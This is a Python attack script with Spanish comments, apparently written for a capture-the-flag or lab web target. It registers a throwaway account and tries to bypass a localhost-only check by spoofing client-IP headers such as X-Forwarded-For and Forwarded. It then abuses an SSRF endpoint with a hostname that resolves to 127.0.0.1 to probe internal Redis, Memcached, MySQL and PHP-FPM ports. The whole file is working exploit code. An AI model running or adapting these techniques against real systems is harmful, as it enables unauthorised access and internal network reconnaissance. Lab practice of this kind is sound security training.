#!/usr/bin/env python3
"""
¿Qué pasa si uso 'localhost' en lugar de '127.0.0.1'?
¿O diferentes representaciones de localhost?
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar si puedo acceder directamente a localhost sin SSRF
print("[*] Probando edit directamente...")
resp = session.post(f"{TARGET}/", data={
    'action': 'edit',
    'new_name': 'DIRECT_CHANGE'
})

if "Only localhost" in resp.text:
    print(f"    [-] Only localhost (esperado)")
elif "Done!" in resp.text:
    print(f"    [+++] ¡FUNCIONO! (no esperado)")

# ¿Qué pasa si el servidor está detrás de un proxy y puedo usar X-Forwarded-For?
# Ya lo probé antes, no funcionó

# ¿Qué pasa si hay un bug en $_SERVER['REMOTE_ADDR']?
# En PHP, REMOTE_ADDR viene del socket TCP, no es manipulable fácilmente

print("\n[*] Intentando manipular remote_addr via diferentes métodos...")

# Probar con PROXY protocol headers
headers_test = [
    {'X-Forwarded-For': '127.0.0.1', 'X-Real-IP': '127.0.0.1'},
    {'Client-IP': '127.0.0.1', 'X-Client-IP': '127.0.0.1'},
    {'Via': '1.1 127.0.0.1'},
    {'Forwarded': 'for=127.0.0.1;host=localhost;proto=http'},
]

for headers in headers_test:
    resp = session.post(f"{TARGET}/", data={
        'action': 'edit',
        'new_name': 'TEST'
    }, headers=headers)
    
    if "Done!" in resp.text:
        print(f"    [+++] Funcionó con headers: {headers}")
        break

print("\n[*] Verificando si el SSRF puede llegar a otros servicios locales...")

# ¿Qué pasa si hay otros servicios corriendo en localhost?
# Redis, Memcached, etc en puertos estándar

test_urls_internal = [
    ("http://127.0.0.1.motherland.com:6379/", "Redis default port"),
    ("http://127.0.0.1.motherland.com:11211/", "Memcached default port"),
    ("http://127.0.0.1.motherland.com:3306/", "MySQL default port"),
    ("http://127.0.0.1.motherland.com:9000/", "PHP-FPM default port"),
]

for url, desc in test_urls_internal:
    print(f"\n[*] Probando {desc}: {url}")
    data_req = {
        'url': url,
        'data[test]': 'value'
    }
    
    try:
        resp = session.post(f"{TARGET}/communicate.php", data=data_req, timeout=10)
        
        if "cURL Error" in resp.text:
            import re
            match = re.search(r'cURL Error: ([^<]+)', resp.text)
            if match:
                error = match.group(1).strip()
                print(f"    Error: {error[:80]}")
    except Exception as e:
        print(f"    Exception: {e}")
